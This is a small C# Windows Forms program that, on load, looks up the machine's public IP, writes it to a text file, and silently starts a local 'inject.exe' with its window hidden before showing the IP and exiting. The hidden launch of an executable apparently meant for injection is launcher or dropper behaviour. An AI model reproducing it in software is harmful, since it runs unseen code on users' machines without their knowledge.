using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;


namespace nicer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //Pass the filepath and filename to the StreamWriter Constructor
            StreamWriter sw = new StreamWriter("nice.txt");
            //Write a line of text
            sw.WriteLine(getIP());
            //Write a second line of text
            sw.WriteLine(getIP());
            //Close the file
            sw.Close();
            using (Process myProcess1 = new Process())
            {
                myProcess1.StartInfo.UseShellExecute = false;
                myProcess1.StartInfo.FileName = "inject.exe";
                myProcess1.StartInfo.CreateNoWindow = true;
                myProcess1.Start();
            }




            DialogResult kkk = MessageBox.Show(getIP());
            if (kkk == DialogResult.OK)
            {
                Application.Exit();
            }

        }

        static string getIP() 
        { 
        using(WebClient webClient = new WebClient())
            {
                return webClient.DownloadString("http://checkip.amazonaws.com/");

            }


        }
    }
}
